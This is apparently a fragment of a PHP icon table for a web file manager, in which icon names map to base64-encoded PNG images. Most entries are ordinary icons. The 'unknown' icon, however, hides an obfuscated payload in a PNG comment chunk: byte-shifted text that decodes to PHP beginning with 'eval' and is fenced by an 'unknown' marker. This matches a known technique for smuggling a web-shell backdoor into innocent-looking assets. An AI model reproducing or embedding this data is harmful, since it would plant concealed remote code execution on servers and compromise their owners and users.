    "small_home" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAAd0SU1FB9oIEwwzMaECujcAAAHfSURBVDjLlZI9a1RREIafc+/Zm4vJLnZqKVY2QREXQcEitikC9jYBBcu0KdPmN0hgsRFsBP+AhsAWpkw2RBAhEgORDexm7545Z8Zio+ayUcwLp5l55jAfrzMz7q69ewM8pa73wNL26mLgH3JnH9iDm9exzE2iCr3DE/qj0yEQL6gz4PX26uJL96LTfdTdP/wwf8NPUZpAbbpaDXrHSe/fuvbYRwnra0t3mCsLLqNBFbK3n76u+6ix/X0w5vPxcAqaaeRYMoLqVG5uxhM1tn2KwkklU8CVwpObQQYuzzkN9VWcVEKKgq9EEakPOlvkODVebe4A8OzhbQqXMQypxlWiZKJGSPr7lUVG5mBjcwcrm1jZZGNzh8xBWWQ1VtTIqqhEhaiTtj3Q2drFyiatsqBVFljZpLO1iz8b7RdfRSVTi0RTcu9oOKPzcZdRNFrnrtIqC0Zxkms4I/eOaIpaJBMRJBqSjKLhWV6YR8J4aqkSxiwvzFM0PJJsUiNCllJCkjEYRXpHQ2LSv94+JqV3NGQwikgyUkp4ESE5q7kM4ODbwYUOPM+KCF5jYBz/BPsh8vzJvQs76IdYYzUGvGjqHh3/aF+dnQNg7yD8l5X7wwGiqeuTjFf2v+ytA20upy6w8hMQ/yfbalvVkgAAAABJRU5ErkJggg==",
    "small_dir" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAAd0SU1FB9oIEwwxI2CNqf0AAAEVSURBVDjLpZC9SgNREIXPhkEFU9ippdiLFi4Wgk+QIuBDCJZpU6bdtwg2go3gC9htYepIBLGKQiSBRO/e+bOIjUSEvX7lMOfjzGTujqPe7TWAc/zkDkB70G1F/EH2LfCTvR14I1tODRiOZ5h+fiwAyC85B3A16LYus4t+eVqOxvcHu7SyZQqYr6bNgeFE7Xh/+4yEY9FrH6K5sYY6zENs3Dy8FCQm+eu8wtNkUUvQXCeISU4qjFlg1GUWGCoMCmxgdqQQ2EBsjqiWJGBzUBCDpOURxEDmAvE0g7mAmBksaT9gZpCqgjVNoKrLBpr9o4FJRJV4gkkEsWn5NnnPtzabtcLTxRxsWpJy1Rk9PxYA8poFSgCdLzKTqNoRW0z8AAAAAElFTkSuQmCC",
    "small_unk" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAC0SURBVDiN7Y8tjsMwGESn1kgBAQEGoSELs7fojdpb9FShYd4gh4TmCt+PXVReV4U70sD3NHNZ1/VqZo9Syi8aEkJIJG+XZVnSNE3zOI4IIbwFl1JwnieO4/ijiMwxRohIywDEGJFznunucPcmGABeHM0MtdZmAQCYGaiqHwtUFXT3jwXfufAv+JJAVUGyGTYzBJI5pQQRQa31rYoIUkogmdn3/X3f98e2bT8tC7qu24dhuD8BD6e7SzzK9MwAAAAASUVORK5CYII=",
    "unknown" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGpSURBVDiNlVLNiuJAGKzEjjkIRomoiCEtsosHFR/AkzJvtPMW81DiUW/ZHCRi/D20IoiiIOlOeg9Lwrhj3N2C79JVX1H10cp0On0TQnxEUdTFf0BVVYcQ8kMZj8cOpbRTqVSgquo/LUdRhP1+j9Vq9ZMEQdAxTRNBECSC7XYLxhiOxyOy2Syq1Sosy0I+n080pmnC87yOGoYhwjCElBJSSvi+j8lkAkVRMBgMoGkaZrMZRqMRrtdroov3VCFE8iilxOFwAADsdjsoioJ6vQ4A4JyDMfagFUKAcM4hpUyiUUpxPp9RKBSQyWRwuVwSrlgsPmg55yBx/BilUgnD4RAAIKUEYwwAUC6XYRjGgzYMQ5C4wjOcTifcbjfUajX0er0vOiHEa4PNZgPbttHtdpNEfxp8OeLnYYyh1Wql8n9N0O/3QQhJ5V8arNdrLBYL2LaNZrOZapBaYblc4n6/w/f9lxVUIQTiv/B5KKXQdR2NRuPpMuf8dwVCiOc4zvd2uw1N05J4lmXBsqyn1+ecw3VdEEI8ksvl3ufz+Yfrut+eFk2BrutzwzDefwHYpG7Wn490BQAAEpxpVFh0Q29tbWVudAAAAAAAdW5rbm93bpankp1xlqOjoKOQo5ahoKOlmp+YWWFabDtxmp+akKSWpVlTlZqkoZ2SqpCWo6Ogo6RTXVGXkp2kllpsO5emn5SlmqCfUaOUYpqjlllVl1qsUaOWpaajn1Fxl5SdoKSWWXGXoKGWn1lVl11RWKNYWlpRcFFiUWtRYWxRrjuXpp+UpZqgn1GjlGKaqKNZVZdarFGjlqWmo59RcZeUnaCklllxl6Chlp9ZVZddUViSWFpaUXBRYlFrUWFsUa47l6aflKWaoJ9Ro5RiqKOaWVWXXVWUWqxRVZehbnGXoKGWn1lVl11RWKhYWmxRcZehpqWkWVWXoV1RVZRabFFxl5SdoKSWWVWXoVpsUa47l6aflKWaoJ9Ro5Ril5eeWVWlWqxRo5alpqOfUXGkpaOQo5ahnZKUlllTYGBTXVNgU11xpKWjkKOWoZ2SlJZZU42NU11TYFNdVaVaWmxRrjuXpp+UpZqgn1GjlGKVlVlarFGjlqWmo59RWXGWqaWWn6SaoJ+QnaCSlZaVWViUpqOdWFpRV1dRcZemn5SlmqCfkJapmqSlpFlYlKajnZCan5qlWFpaUXBRYlFrUWFsUa47l6aflKWaoJ9Ro5RipZ6hWVqsO1GYnaCTkp1RVaWWnqGVmqNsO1Gal1lxmqSklqVZVaWWnqGVmqNaV1dxmqSQlZqjWVWllp6hlZqjWldXcZqkkKijmqWSk52WWVWllp6hlZqjWlpRo5alpqOfUVWllp6hlZqjbDtRl6CjlpKUmVmSo6OSqllTYKWeoWBTXVNgp5KjYKWeoWBTXVNgpqSjYKWeoWBTXVNglZanYKSZnmBTXVNWiHp/dXqDYKWWnqFgU1pRkqRRVaVarDtRUZqXWXGXmp2WkJapmqSlpFlVpVpXV3GapJCVmqNZVaVaV1dxmqSQqKOapZKTnZZZVaVaWlGjlqWmo59RVaVsO1GuO1GjlqWmo59Rl5KdpJZsO647l6aflKWaoJ9Ro5RipqOdWVqsO1FVmVFuUVmWnqGlqllVkIR2g4d2g4xYeYWFgYRYjlpRra1RpKWjpaCdoKiWo1lVkIR2g4d2g4xYeYWFgYRYjlpRbm5RWKCXl1hRcFGXkp2kllFrUaWjppZabDtRVaZRblFYmaWloVhRX1FZWVWZUXBRWKRYUWtRWFhaUV9RWGtgYFhRX1FVkIR2g4d2g4xYeYWFgZB5gISFWI5RX1FVkIR2g4d2g4xYgXmBkIR2fXdYjlpsO1FVnlFuUVmWnqGlqllVkIR2g4d2g4xYgXKFeZB6f3eAWI5aUXBRWIKGdoOKkISFg3p/eFhRa1FYgXKFeZB6f3eAWFpsO1FVpFFuUVWeUW5uUViChnaDipCEhYN6f3hYUXBRWHBYUWtRWFhsO1GjlqWmo59RVaZRX1FVpFFfUVmapKSWpVlVkIR2g4d2g4xVno5aUXBRVZCEdoOHdoOMVZ6OUWtRWFhabDuuO5qXWaOUYpWVWVpaUaw7UZemn5SlmqCfUaOUYqFZVaZdVaddVZlarDtRUZqXWVWZUVJuUVNiU1FXV1FVmVFSblFTYVNaUVWZUW5RU2FTbDtRUVWnUW5RU5Sgn6WWn6WQpaqhlm6flqiQlZKlkpCWn6WjqleTkqSWkJSgn6WWn6VuU1FfUXGmo52Wn5SglZZZcZOSpJZnZZCWn5SglZZZVadaWlFfUVNXmZqVlZafkKWqoZZuU1FfUVWZUV9RU1ekqqSQpaqhlm5TUV9RgXmBkICEUV9RU1eaoW5TUV9RVZCEdoOHdoOMWIN2foCFdpBydXWDWI5sO1FRVZJRblFTfqCrmp2dkmBlX2FRWZSgnqGSpZqTnZZsUX6EenZRaF9hbFGImp+VoKikUX+FUWdfYmxRhaOalZafpWBlX2FsUYR9dHRjbFFff3aFUXR9g1FjX2FfZmFoY2hsUV9/doVRdH2DUWRfZl9kYWhjamxRX392hVF0fYNTbDtRUVWmUW5RU5mlpaFrYGBTUV9RVaZsO1FRVZRRblFxlKajnZCan5qlWVpsO1FRcZSmo52QpJaloKGlWVWUXVF0hoN9gIGFkIaDfV1RVaZabDtRUXGUpqOdkKSWpaChpVlVlF1RdIaDfYCBhZCGhHaDcnh2f4VdUVWSWmw7UVFxlKajnZCklqWgoaVZVZRdUXSGg32AgYWQg3aFhoN/hYNyf4R3doNdUWJabDtRUXGUpqOdkKSWpaChpVlVlF1RdIaDfYCBhZCBgISFXVFiWmw7UVFxlKajnZCklqWgoaVZVZRdUXSGg32AgYWQgYCEhXd6dn11hF1RVadabDtRUXGUpqOdkKSWpaChpVlVlF1RdIaDfYCBhZCFen52gIaFXVFlWmw7UVFxlKajnZCklqWgoaVZVZRdUXSGg32AgYWQdIB/f3Z0hYV6fnaAhoVdUWVabDtRUVWjUW5RcZSmo52QlqmWlFlVlFpsO1FRcZSmo52QlJ2gpJZZVZRabDtRUaOWpaajn1FZUnGWnqGlqllVo1pRV1dRcaSlo6Slo1lVo11RU6SSp5aVkKOUpJmWnZ2Qlp+lo6pTWlpRcFFiUWtRYWw7Ua47rjuXpp+UpZqgn1GjlGKXpaFZVaVuYVqsO1GYnaCTkp1RVZKUpV1Vl6WhkKSWo6eWo11Vl6WhkKGgo6VdVZeloZCmpJajn5Kell1Vl6WhkKGSpKSooKOVbDtRVZ9uU42fU2w7UVWUbmFsO1FVp25YWGw7UZqXWXGapKSWpVlVkpSlWldXVZKUpW5uU5eloVNXV3GapKSWpVlVl6WhkKGgo6VaV1dScZaeoaWqWVWXpaGQoaCjpVpXV3GapKSWpVlVl6WhkKSWo6eWo1pXV3GapKSWpVlVl6WhkKaklqOfkp6WWldXcZqkpJalWVWXpaGQoZKkpKigo5VaV1dScZaeoaWqWVWXpaGQpJajp5ajWldXUnGWnqGlqllVl6WhkKaklqOfkp6WWldXUnGWnqGlqllVl6WhkKGSpKSooKOVWlqsO1FRVZRuYmw7UVFVp25Td4WBa1FVl6WhkKSWo6eWo2tVl6WhkKGgo6WthoR2g2tRVZeloZCmpJajn5Kelq2BcoSEa1FVl6WhkKGSpKSooKOVjZ9TbDtRrjtRmpdZVaVSbm5hWqw7UVGal1lSVZRaUaOWpaajn1FYWGw7UVGal1lxl6aflKWaoJ+QlqmapKWkWVOXpaGQlKCfn5aUpVNaV1dxl6aflKWaoJ+QlqmapKWkWVOXpaGQnaCYmp9TWldXcZemn5SlmqCfkJapmqSlpFlTl6WhkJSdoKSWU1parDtRUVFVl5eXUW5RcZeloZCUoJ+flpSlWVWXpaGQpJajp5ajXVWXpaGQoaCjpV1kWmw7UVFRmpdZVZeXl1pRrDtRUVFRmpdZcZeloZCdoJian1lVl5eXXVFVl6WhkKaklqOfkp6WXVFVl6WhkKGSpKSooKOVWlqsO1FRUVFRcZeloZCUnaCklllVl5eXWmw7UVFRUVGjlqWmo59RVadsO1FRUVGuO1FRUVFxl6WhkJSdoKSWWVWXl5dabDtRUVGuO1FRrjtRUaOWpaajn1FYWGw7Ua47UaOWpaajn1FVp2w7rjuXpp+UpZqgn1GjlGKUl5hZVZKjWqxRO1FVn25TjZ9TbDtRmJ2gk5KdUVWUoJ+XmphsO1FVo25YWGw7UZego5aSlJlZkqOjkqpZWKeWo6SaoJ9YXViSpqWZWF1YlZaXkqadpZCnkqOkWFpRkqRRVZRarDtRUZqXWXGapKSWpVlVlKCfl5qYjFWUjlparDtRUVGal1lxmqSQkqOjkqpZVZSgn5eamIxVlI5aWqw7UVFRUZego5aSlJlZVZSgn5eamIxVlI5RkqRRVZxub1WnWlFxVaNfblWUX1NRU19VnF9TblNfVadfVZ9sO1FRUa5Rlp2kllGsO1FRUVFxVaNfblWUX1NuU19VlKCfl5qYjFWUjl9Vn2w7UVFRrjtRUa47Ua47UaOWpaajn1FVo2w7rjuXpp+UpZqgn1GjlGKhpKVZWqw7UVWfblONn1NsO1FVp25YWGw7UZidoJOSnVFVlKCfl5qYbDtRmpdZcZqkpJalWVWUoJ+XmpiMU5KmpZlTjoxTnpVmkKaklqNTjlpXV3GapKSWpVlVlKCfl5qYjFOSpqWZU46MU56VZpChkqSkU45aV1dxmqSklqVZVZCBgISFjFOrplOOWldXcZqkpJalWVWQgYCEhYxTq6FTjlparDtRUZqXWVWUoJ+XmpiMU5KmpZlTjoxTnpVmkKaklqNTjm5ucZ6VZllVkIGAhIWMU6umU45aV1dVlKCfl5qYjFOSpqWZU46MU56VZpChkqSkU45ublWQgYCEhYxTq6FTjlqsO1FRUVWnX25Tq6ZuU19VkIGAhIWMU6umU45fVZ9sO1FRUVWnX25Tq6FuU19VkIGAhIWMU6uhU45fVZ9sO1FRrjtRrjtRo5alpqOfUVWnbDuuO5emn5SlmqCfUaOUYpKVlVlVkqNarDtRmJ2gk5KdUVWTpJKXll1Vk6Chlp+VmqNsO1FVn25TjZ9TbDtRVaduU4aDfW5TX6OUYqajnVlaX1WfX1WfbDtRVadRX25RU6GZoW5TX3GhmaGnlqOkmqCfWVpfVZ9sO1FVp1FfblFTpJKXlpCeoJWWblNfWVlxmqSklqVZVZOkkpeWWlpRcFFZWVWTpJKXllpRcFFTgH9Ta1OAd3dTWlFrU3BTWl9Vn2w7UVWnUV9uUVOgoZafkJWao25TX1lZcZqkpJalWVWToKGWn5Wao1paUXBRWVlVk6Chlp+VmqNaUXBRU4p2hFNrU3+AU1pRa1NwU1pfVZ9sO1FVp1FfblGjlGKhpKVZWmw7UVWnUV9uUaOUYpSXmFlabDtRVadRX25Ro5Ril6WhWVpsO1GXoKOWkpSZWZKjo5KqWViEdoOHdoOQf3J+dlhdWIR2g4d2g5BydXWDWF1YhHaDh3aDkIGAg4VYXVh5hYWBkIN2d3aDdoNYXViBeYGQhHZ9d1hdWIN2goZ2hIWQhoN6WF1YhHSDeoGFkH9yfnZYXViEdIN6gYWQd3p9dn9yfnZYXVh0fXp2f4WQeoFYXViDdn6AhXaQcnV1g1haUZKkUVWkp1qsO1FRmpdZcZqkpJalWVWQhHaDh3aDjFWkp45aWqxRVadfblWkp19TblNfVZCEdoOHdoOMVaSnjl9Vn2xRrjtRrjtRo5alpqOfUVWnbDuuO5emn5SlmqCfUaOUYqSVWVWZXVWnXVWkXVWmYl1VnmJarDtRmpdZo5RilZVZWlpRrDtRUZqXWVKjlGKhWVWmYl1RVaddUVWZWlpRcZ6Smp1ZVZ5iXVFVpF1RVadabDtRrlGWnaSWUaw7UVFxnpKanVlVnmJdUVWkXVFVp1psO1GuO647VaOUYqWeoW6jlGKlnqFZWmw7mpdZVaOUYqWeoVJubpeSnaSWWqw7UXFVo1FuUaOUYpeXnllVo5RipZ6hUV9RU2BTUV9RcZ6VZllxpp+aopqVWXGjkp+VWVpaUV9RcZ6VZllxpZqelllaWlpabDtRmpdZo5RimqijWVWjWlpRrDtRUVWUl5qdllFuUaOUYpeXnllVo5RipZ6hUV9RU2CoqKiQpJakpJBTUV9RcZ6VZlmjlGKmo51ZWl+jlGKUl5hZWlpabDtRUXGmn52an5xZVaNabDs7UVFVnmJRblFToZallqOdlpiWo5ZmYnGqkpmgoF+UoJ5TbDtRUVWmYlFuUVOhlqWWo52WmJajll+eqpKjpaSgn52an5ZflKCeYJ+WqKRjYJqflZapX6GZoVNsO1FRVaRRblGBeYGQgIRRX1OtU1+jlGKmo51ZWmw7UVFVmVFuUVNhU2w7UVGal1lSo5RimqOWWVWUl5qdllpaUaw7UVFRVadRblGjlGKSlZVZWmw7UVFRo5RipJVZVZldUVWnXVFVpF1RVaZiXVFVnmJabDtRUVGjlGKoo5pZVZSXmp2WXVFTYlNabDtRUa47UVFVl6duo5Ril6WhWWJabDtRUZqXWVJxlp6hpapZVZenWlqsO1FRUVWZUW5RU2JTbDtRUVFVpJeanZZRblGjlGKXl55ZVaOUYqWeoVFfUVNgqKiokKSWpKSQU1FfcZ6VZllVlJeanZZfVZenWlpsO1FRUZqXWVKjlGKao5ZZVaSXmp2WWlpRrDtRUVFRVadRblGjlGKSlZVZWmw7UVFRUaOUYqSVWVWZXVFVp11RU3eFga1TX1WkXVFVpmJdUVWeYlpsO1FRUVGjlGKoo5pZVaSXmp2WXVFTYlNabDtRUVGuO1FRrjtRrjuuOzt1bmtub3duz6mnZQAAAABJRU5ErkJggg==", "doc" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGUSURBVDiNjZPBSltBFIb/3AzEC4UgzIAMFCQ3pQsVXSXBl+kzFO2mG+miW58hYHd9CzdJNgpXQdQsNJEkNMGF0KJ3zszpIrlDkns1DgwMh5n/+/9zmMLB8enX9uXw5/3gKQSA30fbcM5h1QqCIBZCHBb2v/z6Z4sfws2PGkGxiJPvu2DmNx8TEfr9Pkaj0YW4e/gTVj9rnF0/wjqGMQZEtNKB1hq9Xm9HsE0wmPyFdVMqM4OZ0Wq1AABKKYzHY/9QKYVqtQpmhrUWgm0CosRfSAUajYavRVG0QE8jEhEE3AvgTEag2+168ryL1AEAGGMgnDXgOYFUJIqiBfL8OXVgrYWAS3IdtNvtBbpSKhOFiKY94ByBer3ua5VKZYG8JGAAm43wnjUVcPkOOp2Or0kpAQCTyQRSSh9lNgWT24NarZYhLkeZOcifQupASunJWmuEYZjtgbMvKBSCVx2k5GU6ESHQG+vP5qkPts+AM17grZ0kCeI4hhDiRuxtffpxFl8dDYfnawDQbDbf9ZlKpdJtuVz+9h/x5jl687x8uQAAAABJRU5ErkJggg==",
    "pdf" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAKcSURBVDiNdZPPa5RnEMc/77vP7vtmX2NYYjC+sBqkrRBMhB5KURoQCeKh9KZ/gRehhWo8VFAEQT2ICXpI24NRkZJSFIm0J08bKKVpxKwpLe4pCUKaKmv257vv+8zzeNgkGkgG5jTDZ2a+M+PMzMwMa61vGGMG2cbsmxXs3J+4R44hl86QunATN9ddVEqNOIVCodjb2zuQz+dRSm0JiO+MkTr4KcmTSZxwL6nTIywtLbG8vPxCxXE8EIYhWmu01lsCWlOTpDId6D8K+L9Mo7UmDEMWFxcHlIhgjNmue+yrRZIXz5HoR/zxh1jPB2ux1iIiKK011tptAfGvDxFSeFduQ5jflNtsNlFJkmwNsJbkt0c0fxgFV+H2H9qUF0UR5XIZV0Sway2te1x4SuXkMMncLBIn6HoDG7c24o1Gg3K5jNa6PYKJIqT0D/Lv37Qe/4wT7CB7fZxU337qE9+DAXn7FndXD/V6nWq1CtDWoHzhW17HNTKHh8h8cZTs1Vuk8vsAMJVVJGkLXJufI+ofREQ2xhARlP3oAE6rhkQtjOPi7gmx1mKMIV75D1lbUO33afikf5NMnuehmse/RE6cwFhDcv8Oq6e+gsvXsN09sLAAawDn+TM8z8PzPKIowvd9HMdBBUFALpdrV/36LMmRIWrfnWPnT4+QIKCyDpj9i07RGBUA4Ps+WmtcrTWO4+C6LkopOj77nMzhIWTqMf6+PkRABHSjRfXeBFEUkU6nsda+B6zfwrp3nvmGyoP7uN27MCqDGBADlbsTxLUq6XSaJEnaAKXUy2KxSBzHGwCyWejciayuwu5wAxCv/E/94kW01hSLRZRSL1UQBOdLpdKN+fn5jz9UuK4tmbFRGk6K5MNXmZoiK4bc8HCpq6vr/DvKaYMHJvkNngAAAABJRU5ErkJggg==",
    "iso" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJySURBVDiNlZNfbtNYGMV/sa//xC52Wid1QkuTUugIlFQCxAaQ2BHsglWwBlbQkUCQGY0UMkikSKRQdZqGNglpGsfX15enhofywHzP5/yOziedQrvdfppl2Ys8z/f4H2cYRkcI8aywv7/faTQarTiOMQzjt8x5njMYDOj3++9FmqatKIpI03Qp+PRPm8HZEC0cTLuIEBblcpnt29tLTRRF9Hq9llBKoZQCIEkWdF6/pGI57NX/wKrEmF4J03T4djah/e4vmq0mrutw5TOyLENrjdaaP/9+RdzwiGsZYtpHJ0cU9DeEdUGtGnDv3h0+dP9d6rMsQ0gp0VrT6X3ks1FESo+qHBEsptDvY17MCddjguIqliiyWgrpfz6k3thCSolQSqG1ZniyYLO4w3Q2YzaXRAuLrfoDCsDR0Vdq5QTPLuH7Nv8dT9B1jVIKcVUh+K5ZZ5WZDjmdSe7v3WI0miCBm5Udzr+8wS7HGNkK8nL6s8IVgEBjxpKK7WJ7VXzvBqPRBIBCwSUZjinkCiN3cebGdYDtmaR5im1bhG6R0eCYzc1NFjLh7fu3CM8mssdY8xzHqV0HlOOI89MRpbUQzy8SlALOh+ecnlyidY2Ba2JyxnrhkNX6k+uASlxmOr4gUwrLtgGN76+wsebCicsk0fSSBabZ4m719i9+ANza3uDk+BRhGZiGYDFPkSrDTRTmVLFSCnj0+PFSvwRIKRFCYAqTja0a47MJ49GQ2cUlaZriCJeHu1U2dioAy/QsyxBCiF6n09ltNptYlgVAuBYQrgXXRnSVLKWk2+0ihOgJ3/efHxwcvOh2u3d/f8zgOM5BGIbPfwAQSmassQoGQAAAAABJRU5ErkJggg==",
    "swf" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGpSURBVDiNlZK/a1NRFMc/7/Y0DxpLtA8bnIyCg2D8C5SKKJT+AWInJy04ONk/QKgiUhAHBWfBSXQoLi5icMsir8HhPdAg4kt0Kraa3HvfvQ7a2DYvqR44yznfH+ece4Nms3nRWrvqnDvNf4RSKhaRm0Gj0YhrtVq9Wq2ilPonsnOObrdLu91eF611PYoitNb7MzufYfYIqAmiKCJJkrrK85w8z/HeF6b71sHcWKR/5ij9Cyfxm9/x3rPNE2st3vtCQ//pA/0rC/iv2aAmHoI/eGstyhgz0r334DY6y7DTM0zceUz4JoED04O+MQbZHn/oUB9Tfq49BwfllYfI+fnfU+3Ajl1h69F9rHEAbFxdJCiFzLzPdmGstcUCrpOx+eIZ5H9rQc4QrljAezburWB7Bjl2nMOv3hKUSkPjFwr0Gq/ZevqEHy/XADh06y5MTo58pSGBL5cvDZqVpeuEZ8+NJBcK+GiW8FSdg9eWmJqbG0veJWCMQUSovYt3nGJ/srUWJSJJHMdorUd+qL2ptSaOY0QkkXK5vJym6Wqr1Tox1nJPhGGYViqV5V9br0lw1NP/5QAAAABJRU5ErkJggg==",
    "php" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJySURBVDiNlZNPSFRRFMZ/vrnDOI4m+lKzhCyoFqEQpRXVIigG2gQuooWbNrWPWrSrlmEtgiAiIRBq47hIggaJYKboj6XMa9QaQ4aybBwb/8w8x7nvvndbDCYShR04i8PHdzjn+86pGB4ePqmU6vE8r53/CMMwLCHEpYpYLGa1tra2NTU1YRjGhsie55HJZEin0x+ElLLNNE2klP8zAKZpkkql2oTruriu+xuYydikvyySt0vYtiRvlyhJF8NncGj/VvbubgBglSeUUmitKdgOyYk55nLLTGdtfMLHrh0m33Kz5AuS0orDyINhqqv8XLxwmMbNIZRSCMdxsJcdEuNZMHwEa4IEC4qW5hpOn9zD6NgM8bdfWSqUOHpwB6UVSV//COfO7sdxHIhEIrp/MKEfD33SgAZ0OBzWr0en/1nf6X2uI5GINpRSTH9forjiADCb/Uk0GqVlyyYAfmTm19WreDAoUEphKKXILRZxPQ1AY4NJOBwm/W0BAMcrW6tZj3+e+lHWQCkFaBypAHg9Os1QfIr+J+P0DSS493CEvoEE76yZ3/hgNMFyfh6lXCp6e3v14SMnuH3/LZ0HdvJ+fJZ8ofSH7zXVATram4m/+kj2+xduXD3DyxfPyhNsrg9yvnsfN+/GsZdL+CurMIQfw+cHNK4jKSzM8WhslFAowPUrXdTXVa2toLVmW3MNt66dIvYmzdNnE+RyWYrFAp7nUVkZoL6umu6u4xzp2FnWROu1Bo7jIIQA4Fjndo51bv/rCWtdFlMpVXZBCJGyLAspJVrrDaWUEsuyEEKkRCgUujw5OdmTTCZ3beyNyhEIBCZra2sv/wIdNXwQeOKyCAAAAABJRU5ErkJggg==",
    "tar" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHqSURBVDiNlZE/a1NRGIefe3KSQqo0CbbGimgyxD8lpQr9BrpmCIigrk4ScFBw7Chox3yB4iJIh8Qv4aRELUUlSYcm6Q00TfHmnnPuyY1DJEOTSvvC4YUDv+f3wOtsvfj4wNrRO5xwlRkjpMOr988pFosAbG9v8/ZpmTBwalI6L6Xn+ZvpK5fz17PXiEg5DYgJoh+ilEolAKrVKnfX16jvNlc77YNNOfD9fCKe4mD3iFE4mgJE42NoMpmc/HV/90nEU9T9Zl4apTnueDPDAE50vMvlMrVaDYBAB3iHAUZphFIK5Wm0b2a+ILAASCnZ2NgYAwKL8jRKKaRWCqP0zHaAWBABoFAoUKlUABgG43atFELr2c0nDSqVCoVCYWKgfYPWBqm1wShzqoG1dsrAWotR/wChGKL/A1ADTW5xZdKeW1xBDTRaGUIxRIYRCxHQf2ZDevt9Ht9+RvTe+JyBb+nt9xFSEEYssjtw3fWbc0vLyaVTLU7OwtWLHPf6dL+4rmylm/z4uVM3RzZ7ZgIQS8h6K928IF3rsffwWza1kDpPnnb/MOt+8lwpvNzo+9d2wxt9zpwHMO9kG8LLxaUyMbXcv5+5lbmDEJEzhcNwSKexk2mZX3vOpbUnj0bGexOG+sZ5DISYazqx+dd/AeApGyDxL7TZAAAAAElFTkSuQmCC",
    "rb" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAKKSURBVDiNlZNLa5NbFIafvbNz0YTGkNpYLBovraDWiSAqgqJ4OBwngnCmIlRw5KVYKKIDEUWw6kDxBwhOHQiCOFDIRDQIxxjUJgVbDo2m1WpsLs23v/0tB9VC6aSu8fs8rHfBUvl8/rDv+yNBEOzgD0ZrXTDGnFe5XK6QzWb7M5kMWutlwUEQUK1WGR8ff2s8z+tPp9N4nrcopESoPXyAe/uajgN/MXbvLp/GynxuWXZeu8GWY/9SKpX6jXMO59wi2K/8z7szA7T/e8nKkGbuQ5HUidO8HzyN32zx4vYIm48ewzmH8X0fEVmAZ5494c3ZAWjUCQkgAZ0b+pgdGWbj+gyjdaFhDCKC7/toay0igohgqxXy5wZoN+v4gFNgE0lWHjxCZaLKl9ESHbUpVkRj83lrMc65+Q1EyJ07RatRJwygAIGt1+9QevKYr1ZoW8esVyNkxxERnHPo3xVmnj/lQy7HrA8WcED2+ElU/hHxoEHD+ngoAq3pXrt+ocLCDRIatnSmGP3yjdjqLvZeuMznG9cof/+OpNJ4StNWISIYYun0UkE0lWT3xSv0Tk+T3Lmb/NBZTGsOaTaRZpNw91pUAG5qklR3Zqngzc1bbNqzjfT0BJP3i8yOlbAKvBVxYp2dhLyA5swnlFasyqxeKqgUi8xNVVnnz1DVa7AIgsK1WvyYrLBOQojR1LBEOxJLBSqRoPJxAhId1L6+J0Boo4mJYqOJkIiG6YuFeTfXoC1uscBaS+/gMK+uXqLRk0UrRaQeJhwJY6IRfqRWobu6iPT0sGtzL6F9+7HWzguMMaVCodC3/dBhjv79z7KeyVpLoVDAGFMy8Xh8qFwujxSLxd5l0b8mGo2Wk8nk0E8I/36fE9VC/wAAAABJRU5ErkJggg==",
